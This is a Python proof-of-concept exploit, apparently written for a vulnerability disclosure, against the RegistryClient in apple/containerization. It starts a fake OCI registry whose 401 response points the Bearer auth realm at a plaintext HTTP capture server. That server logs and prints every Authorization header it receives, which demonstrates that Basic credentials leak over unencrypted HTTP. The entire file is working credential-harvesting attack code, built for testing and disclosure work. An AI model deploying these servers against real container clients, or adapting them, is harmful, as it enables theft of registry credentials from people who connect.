#!/usr/bin/env python3
"""
Evil OCI Registry PoC — OE1107246042217
Demonstrates Bearer realm TLS downgrade and SSRF in apple/containerization RegistryClient.

Two servers:
  - evil_registry (port 5001): responds to OCI /v2/ ping with 401 + WWW-Authenticate
    pointing realm to http://capture_server (plaintext, attacker-controlled)
  - capture_server (port 5002): records every inbound Authorization header

Attack vector: RegistryClient.fetchToken() passes the realm URL directly to requestJSON()
which calls request() — request() unconditionally attaches self.authentication to ANY URL,
including the attacker-controlled http:// realm.
"""

import threading
import json
from http.server import BaseHTTPRequestHandler, HTTPServer

CAPTURE_LOG = []
CAPTURE_LOCK = threading.Lock()

EVIL_PORT   = 5001
CAPTURE_PORT = 5002


class EvilRegistryHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass  # suppress default output

    def do_GET(self):
        # OCI distribution spec: /v2/ version check
        if self.path == "/v2/":
            realm = f"http://localhost:{CAPTURE_PORT}/token"
            self.send_response(401)
            self.send_header("Content-Type", "application/json")
            self.send_header(
                "WWW-Authenticate",
                f'Bearer realm="{realm}",service="evil-registry.local",scope="repository:test/image:pull"',
            )
            self.end_headers()
            self.wfile.write(json.dumps({"errors": [{"code": "UNAUTHORIZED"}]}).encode())
        else:
            self.send_response(404)
            self.end_headers()


class CaptureHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def do_GET(self):
        auth = self.headers.get("Authorization", "<no Authorization header>")
        with CAPTURE_LOCK:
            CAPTURE_LOG.append(auth)

        print(f"[CAPTURE] Authorization header received: {auth}", flush=True)

        # Return a minimal valid token response
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps({"token": "captured", "expires_in": 300}).encode())


def run_server(handler, port):
    srv = HTTPServer(("0.0.0.0", port), handler)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    return srv


if __name__ == "__main__":
    import sys, time

    run_server(EvilRegistryHandler, EVIL_PORT)
    run_server(CaptureHandler, CAPTURE_PORT)

    print(f"[*] Evil registry  listening on http://localhost:{EVIL_PORT}", flush=True)
    print(f"[*] Capture server listening on http://localhost:{CAPTURE_PORT}", flush=True)
    print("[*] Waiting for RegistryClient connection (30 s)...", flush=True)

    deadline = time.time() + 30
    while time.time() < deadline:
        with CAPTURE_LOCK:
            if CAPTURE_LOG:
                break
        time.sleep(0.2)

    with CAPTURE_LOCK:
        captured = list(CAPTURE_LOG)

    if not captured:
        print("[FAIL] No request received from RegistryClient within timeout.", flush=True)
        sys.exit(1)

    print("\n=== RESULT ===", flush=True)
    for h in captured:
        if h.startswith("Basic "):
            print(f"[PASS] TLS-downgrade confirmed — Basic credentials sent over plaintext HTTP:", flush=True)
            print(f"       Authorization: {h}", flush=True)
        else:
            print(f"[INFO] Authorization: {h}", flush=True)
    sys.exit(0)
